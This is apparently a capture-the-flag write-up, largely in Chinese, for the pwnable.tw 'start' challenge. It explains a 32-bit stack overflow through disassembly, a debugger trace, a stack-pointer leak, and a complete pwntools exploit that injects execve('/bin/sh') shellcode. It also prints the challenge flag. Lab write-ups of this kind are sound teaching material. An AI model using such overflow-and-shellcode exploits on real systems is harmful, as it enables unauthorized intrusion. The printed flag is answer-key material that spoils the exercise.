# start 


```
user@vm-ubuntu20:~/tw$ checksec start
[*] '/home/user/tw/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

只有兩個 func，有 overflow

https://syscalls32.paolostivanin.com/

syscall write

syscall read fd:0 size:0x3c buf:esp

把 shellcode 寫上 stack 控制 ret 跳上 shellcode

問題不知道 shellcode aka esp 位置，也沒有 gadget `JMP ESP` 可以用

可以利用到上一個 syscall write ，第一次先 ret 到 `08048087` 印出 saved esp（這時候esp stack 在start 的caller(???) 不確定)，由於已經 esp-0x14 所以在填回去時要在 +0x14

比較關鍵的點是一開始的，所以 esp -0x14 後時再取esp可以拿到上一個esp
>.text:08048060                 push    esp

第二次在寫入 shellcode 和填上確定的 shellcode 位置


```c 
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0x4
 EBX  0x1
 ECX  0xfffa8a2c —▸ 0xfffa8a30 ◂— 0x1
 EDX  0x14
 EDI  0x0
 ESI  0x0
 EBP  0x0
 ESP  0xfffa8a2c —▸ 0xfffa8a30 ◂— 0x1
*EIP  0x804808f (_start+47) ◂— int 0x80
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
   0x804809c <_start+60>    ret    
    ↓
   0x8048087 <_start+39>    mov    ecx, esp
   0x8048089 <_start+41>    mov    dl, 0x14
   0x804808b <_start+43>    mov    bl, 1
   0x804808d <_start+45>    mov    al, 4
 ► 0x804808f <_start+47>    int    0x80 <SYS_write>
        fd: 0x1 (/dev/pts/6)
        buf: 0xfffa8a2c —▸ 0xfffa8a30 ◂— 0x1
        n: 0x14
   0x8048091 <_start+49>    xor    ebx, ebx
   0x8048093 <_start+51>    mov    dl, 0x3c
   0x8048095 <_start+53>    mov    al, 3
   0x8048097 <_start+55>    int    0x80
   0x8048099 <_start+57>    add    esp, 0x14
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ ecx esp 0xfffa8a2c —▸ 0xfffa8a30 ◂— 0x1
01:0004│         0xfffa8a30 ◂— 0x1
02:0008│         0xfffa8a34 —▸ 0xfffaa38a ◂— './start'
03:000c│         0xfffa8a38 ◂— 0x0
04:0010│         0xfffa8a3c —▸ 0xfffaa392 ◂— 'SHELL=/bin/bash'
05:0014│         0xfffa8a40 —▸ 0xfffaa3a2 ◂— 'COLORTERM=truecolor'
06:0018│         0xfffa8a44 —▸ 0xfffaa3b6 ◂— 'TERM_PROGRAM_VERSION=1.72.0'
07:001c│         0xfffa8a48 —▸ 0xfffaa3d2 ◂— 'LANGUAGE=en_US:'
    
    
    ntees. See https://docs.pwntools.com/#bytes
  r.recvuntil(':')
[DEBUG] Received 0x14 bytes:
    b"Let's start the CTF:"
[*] Switching to interactive mode
[DEBUG] Received 0x14 bytes:
    00000000  30 8a fa ff  01 00 00 00  8a a3 fa ff  00 00 00 00  │0···│····│····│····│
    00000010  92 a3 fa ff                                         │····│
    00000014
```

```c
.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
```

exploit

```python=
from pwn import *

context(log_level="debug")


shellcode='''
xor eax,eax
push eax
push %s
push %s
mov ebx, esp
xor ecx,ecx
xor edx,edx
mov eax, 0xb
int 0x80''' %(u32('/sh\0'),u32('/bin'))

r = remote('chall.pwnable.tw',10000)

payload = b'A' * 0x14 + p32(0x08048087)
r.recvuntil(':')
r.send(payload)
esp = u32(r.recv(4))

payload = b'A' * 0x14 + p32(esp+0x14) + asm(shellcode)

r.send(payload)
r.interactive()

# FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```